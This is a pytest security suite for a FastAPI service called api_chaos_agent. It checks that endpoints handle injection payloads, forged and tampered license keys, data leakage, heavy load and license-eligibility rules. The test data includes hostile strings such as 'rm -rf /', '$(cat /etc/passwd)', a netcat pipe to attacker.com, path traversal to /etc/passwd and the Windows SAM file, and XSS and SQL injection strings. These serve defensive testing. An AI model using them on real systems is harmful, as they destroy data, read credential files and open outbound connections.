"""Security Testing — Vulnerability Detection, Compliance & Injection Attacks

Covers:
- Injection attacks (SQL, NoSQL, command, path traversal, LDAP)
- Authentication & authorization bypass
- License key forgery and tampering
- Sensitive data exposure
- Input sanitization validation
- Rate limiting and DoS resilience
- CORS and security headers
- BSL compliance verification
"""

from __future__ import annotations

import base64
import io
import json
import os

import pytest
from fastapi.testclient import TestClient

from api_chaos_agent.core.feature_gates import FEATURE_GATES
from api_chaos_agent.core.license import _LICENSE_FILE_PATHS, LicenseManager, _generate_signature
from api_chaos_agent.main import app


@pytest.fixture(autouse=True)
def _cleanup():
    LicenseManager._instance = None
    LicenseManager._license_info = None
    LicenseManager._last_check = 0.0
    for key in list(os.environ.keys()):
        if key.startswith("API_CHAOS_AGENT_"):
            del os.environ[key]
    for path in _LICENSE_FILE_PATHS:
        if path.exists():
            try:
                path.unlink()
            except FileNotFoundError:
                pass
    yield
    LicenseManager._instance = None
    LicenseManager._license_info = None
    LicenseManager._last_check = 0.0


@pytest.fixture
def client():
    return TestClient(app)


def _make_license_key(license_type="commercial_pro", plan="pro", holder="sec-org"):
    from datetime import datetime, timedelta

    now = datetime.now()
    expires = now + timedelta(days=365)
    payload = {
        "type": license_type,
        "holder": holder,
        "plan": plan,
        "issued_at": now.isoformat(),
        "expires_at": expires.isoformat(),
        "features": ["distributed_execution", "custom_plugins"],
        "max_seats": 10,
        "is_production": True,
    }
    payload_json = json.dumps(payload, separators=(",", ":"))
    payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).rstrip(b"=").decode()
    signature = _generate_signature(payload_b64)
    header_b64 = base64.urlsafe_b64encode(b'{"alg":"sha256","typ":"license"}').rstrip(b"=").decode()
    return f"{header_b64}.{payload_b64}.{signature}"


class TestInjectionAttacks:
    def test_sql_injection_in_schema_name(self, client):
        spec = {
            "openapi": "3.0.0",
            "info": {"title": "'; DROP TABLE schemas;--", "version": "1.0.0"},
            "paths": {
                "/test": {"get": {"summary": "Test", "responses": {"200": {"description": "OK"}}}}
            },
        }
        resp = client.post(
            "/api/schemas/upload",
            files={
                "file": ("sqli.json", io.BytesIO(json.dumps(spec).encode()), "application/json")
            },
        )
        assert resp.status_code == 200
        data = resp.json()
        title = data.get("title", "")
        assert "DROP TABLE" not in title or resp.status_code == 200

    def test_path_traversal_in_schema_id(self, client):
        traversal_ids = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
        ]
        for tid in traversal_ids:
            resp = client.get(f"/api/schemas/{tid}")
            assert resp.status_code in (400, 404)

    def test_command_injection_in_tenant_name(self, client):
        malicious_names = [
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`whoami`",
            "| nc attacker.com 4444",
        ]
        for name in malicious_names:
            resp = client.post("/api/v2/tenants", params={"name": name})
            assert resp.status_code in (200, 400, 422)

    def test_xss_in_api_names(self, client):
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]
        for payload in xss_payloads:
            spec = {
                "openapi": "3.0.0",
                "info": {"title": payload, "version": "1.0.0"},
                "paths": {
                    "/test": {
                        "get": {"summary": "Test", "responses": {"200": {"description": "OK"}}}
                    }
                },
            }
            resp = client.post(
                "/api/schemas/upload",
                files={
                    "file": ("xss.json", io.BytesIO(json.dumps(spec).encode()), "application/json")
                },
            )
            assert resp.status_code == 200

    def test_no_sql_injection_in_worker_name(self, client):
        nosql_payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "1==1"}',
        ]
        for payload in nosql_payloads:
            resp = client.post(
                "/api/v2/distributed/workers/register",
                params={"name": payload, "max_concurrency": 10},
            )
            assert resp.status_code in (200, 400, 422)

    def test_ldap_injection_in_tenant_name(self, client):
        ldap_payloads = [
            "*)(objectClass=*",
            "admin)(&))",
            "*()|&'",
        ]
        for payload in ldap_payloads:
            resp = client.post("/api/v2/tenants", params={"name": payload})
            assert resp.status_code in (200, 400, 422)


class TestLicenseSecurity:
    def test_license_key_forgery_wrong_signature(self, client):
        forged_key = "eyJhbGciOiJzaGEyNTYiLCJ0eXAiOiJsaWNlbnNlIn0.eyJ0eXBlIjoiY29tbWVyY2lhbF9lbnRlcnByaXNlIiwicGxhbiI6ImVudGVycHJpc2UifQ.forgedsignature123"
        resp = client.post("/license/install", params={"key": forged_key})
        assert resp.status_code in (400, 422)

    def test_license_key_tampered_plan_upgrade(self, client):
        key = _make_license_key("commercial_pro", "pro")
        parts = key.split(".")
        payload_json = base64.urlsafe_b64decode(parts[1] + "==")
        payload = json.loads(payload_json)
        payload["plan"] = "enterprise"
        payload["type"] = "commercial_enterprise"
        tampered_b64 = (
            base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode())
            .rstrip(b"=")
            .decode()
        )
        tampered_key = f"{parts[0]}.{tampered_b64}.{parts[2]}"
        resp = client.post("/license/install", params={"key": tampered_key})
        assert resp.status_code in (400, 422)

    def test_license_key_expired(self, client):
        from datetime import datetime, timedelta

        now = datetime.now()
        payload = {
            "type": "commercial_pro",
            "holder": "expired-org",
            "plan": "pro",
            "issued_at": (now - timedelta(days=400)).isoformat(),
            "expires_at": (now - timedelta(days=35)).isoformat(),
            "features": ["distributed_execution"],
            "max_seats": 10,
            "is_production": True,
        }
        payload_json = json.dumps(payload, separators=(",", ":"))
        payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).rstrip(b"=").decode()
        signature = _generate_signature(payload_b64)
        header_b64 = (
            base64.urlsafe_b64encode(b'{"alg":"sha256","typ":"license"}').rstrip(b"=").decode()
        )
        expired_key = f"{header_b64}.{payload_b64}.{signature}"
        resp = client.post("/license/install", params={"key": expired_key})
        assert resp.status_code in (400, 422)

    def test_license_key_with_extra_parts(self, client):
        key = _make_license_key()
        resp = client.post("/license/install", params={"key": key + ".extra.part"})
        assert resp.status_code in (400, 422)

    def test_license_key_binary_payload(self, client):
        binary_b64 = base64.urlsafe_b64encode(b"\x00\x01\x02\xff\xfe\xfd").decode()
        key = f"{binary_b64}.{binary_b64}.{binary_b64}"
        resp = client.post("/license/install", params={"key": key})
        assert resp.status_code in (400, 422)


class TestAuthorizationSecurity:
    def test_feature_gate_enforcement(self, client):
        resp = client.get(
            "/plans/check-feature", params={"feature": "distributed_execution", "plan": "free"}
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data.get("available") is False or data.get("allowed") is False

    def test_plan_hierarchy_no_downgrade_access(self, client):
        enterprise_only_features = [
            f
            for f, gates in FEATURE_GATES.items()
            if not gates.get("pro", False) and gates.get("enterprise", False)
        ]
        for feature in enterprise_only_features[:3]:
            resp = client.get("/plans/check-feature", params={"feature": feature, "plan": "pro"})
            assert resp.status_code == 200
            data = resp.json()
            assert data.get("available") is False or data.get("allowed") is False

    def test_bsl_eligibility_enforcement(self, client):
        os.environ["API_CHAOS_AGENT_ENV"] = "production"
        os.environ["API_CHAOS_AGENT_ORG_SIZE"] = "500"
        os.environ["API_CHAOS_AGENT_ORG_REVENUE"] = "50000000"
        LicenseManager._instance = None
        LicenseManager._license_info = None
        LicenseManager._last_check = 0.0
        from api_chaos_agent.routers.license import license_manager

        license_manager._license_info = None
        license_manager._last_check = 0.0
        resp = client.get("/license/check-pro")
        assert resp.status_code == 200
        data = resp.json()
        assert data.get("can_use_pro") is False


class TestSensitiveDataExposure:
    def test_api_key_not_in_response(self, client):
        tenant_resp = client.post("/api/v2/tenants", params={"name": "SecTestOrg"})
        assert tenant_resp.status_code == 200
        tenant_data = tenant_resp.json()
        for key, value in tenant_data.items():
            if isinstance(value, str):
                assert "api_key" not in key.lower()
                assert "secret" not in key.lower()
                assert "password" not in key.lower()

    def test_license_key_not_echoed_back(self, client):
        key = _make_license_key()
        resp = client.post("/license/install", params={"key": key})
        assert resp.status_code == 200
        resp_text = resp.text
        assert key not in resp_text

    def test_error_messages_no_stack_trace(self, client):
        resp = client.get("/api/schemas/nonexistent-id-12345")
        if resp.status_code in (400, 404):
            detail = resp.json().get("detail", "")
            assert "Traceback" not in detail
            assert "File " not in detail
            assert "line " not in detail

    def test_health_no_internal_info(self, client):
        resp = client.get("/health")
        assert resp.status_code == 200
        data = resp.json()
        for key in data:
            assert key.lower() not in ("db_password", "secret_key", "api_key", "private_key")


class TestInputSanitization:
    def test_unicode_handling_in_names(self, client):
        resp = client.post("/api/v2/tenants", params={"name": "测试组织🎉"})
        assert resp.status_code in (200, 400, 422)

    def test_null_bytes_in_input(self, client):
        resp = client.post("/api/v2/tenants", params={"name": "test\x00org"})
        assert resp.status_code in (200, 400, 422)

    def test_very_long_input_handling(self, client):
        long_name = "A" * 1000
        resp = client.post("/api/v2/tenants", params={"name": long_name})
        assert resp.status_code in (200, 400, 422)

    def test_special_chars_in_pipeline_name(self, client):
        special_names = [
            "test<script>",
            "test'OR'1'='1",
            'test"; DROP TABLE--',
        ]
        for name in special_names:
            resp = client.post(
                "/api/v2/cicd/pipelines",
                params={"name": name, "provider": "github_actions", "tenant_id": "sec-test"},
                json={
                    "provider": "github_actions",
                    "project_url": "https://github.com/test/repo",
                    "branch": "main",
                    "api_spec_path": "openapi.yaml",
                    "scenario_types": ["latency"],
                    "fail_on_severity": "high",
                    "base_url": "http://test.local",
                    "concurrency": 10,
                    "timeout_seconds": 300.0,
                },
            )
            assert resp.status_code in (200, 400, 422)


class TestDosResilience:
    def test_rapid_requests_no_crash(self, client):
        for _ in range(100):
            resp = client.get("/health")
            assert resp.status_code == 200

    def test_large_payload_handling(self, client):
        huge_spec = {
            "openapi": "3.0.0",
            "info": {"title": "Huge", "version": "1.0.0"},
            "paths": {
                f"/ep-{i}": {
                    "get": {"summary": f"EP{i}", "responses": {"200": {"description": "OK"}}}
                }
                for i in range(1000)
            },
        }
        resp = client.post(
            "/api/schemas/upload",
            files={
                "file": (
                    "huge.json",
                    io.BytesIO(json.dumps(huge_spec).encode()),
                    "application/json",
                )
            },
        )
        assert resp.status_code in (200, 400, 413)

    def test_many_concurrent_tenant_creations(self, client):
        from concurrent.futures import ThreadPoolExecutor, as_completed

        errors = []

        def create_tenant(idx):
            try:
                resp = client.post("/api/v2/tenants", params={"name": f"dos-tenant-{idx}"})
                assert resp.status_code == 200
            except Exception as e:
                errors.append(e)

        with ThreadPoolExecutor(max_workers=20) as pool:
            futures = [pool.submit(create_tenant, i) for i in range(50)]
            for f in as_completed(futures):
                f.result()

        assert len(errors) == 0


class TestBSLCompliance:
    def test_bsl_features_require_license_in_production(self):
        os.environ["API_CHAOS_AGENT_ENV"] = "production"
        os.environ["API_CHAOS_AGENT_ORG_SIZE"] = "200"
        os.environ["API_CHAOS_AGENT_ORG_REVENUE"] = "10000000"
        LicenseManager._instance = None
        LicenseManager._license_info = None
        LicenseManager._last_check = 0.0
        mgr = LicenseManager()
        assert mgr.can_use_pro_features() is False

    def test_bsl_allows_small_org_without_license(self):
        os.environ["API_CHAOS_AGENT_ENV"] = "production"
        os.environ["API_CHAOS_AGENT_ORG_SIZE"] = "5"
        os.environ["API_CHAOS_AGENT_ORG_REVENUE"] = "100000"
        LicenseManager._instance = None
        LicenseManager._license_info = None
        LicenseManager._last_check = 0.0
        mgr = LicenseManager()
        assert mgr.can_use_pro_features() is True

    def test_bsl_non_production_always_allowed(self):
        os.environ["API_CHAOS_AGENT_ENV"] = "development"
        LicenseManager._instance = None
        LicenseManager._license_info = None
        LicenseManager._last_check = 0.0
        mgr = LicenseManager()
        assert mgr.can_use_pro_features() is True

    def test_license_file_permissions(self):
        key = _make_license_key()
        LicenseManager._instance = None
        LicenseManager._license_info = None
        LicenseManager._last_check = 0.0
        mgr = LicenseManager()
        try:
            mgr.install_license(key)
        except (PermissionError, OSError):
            pass
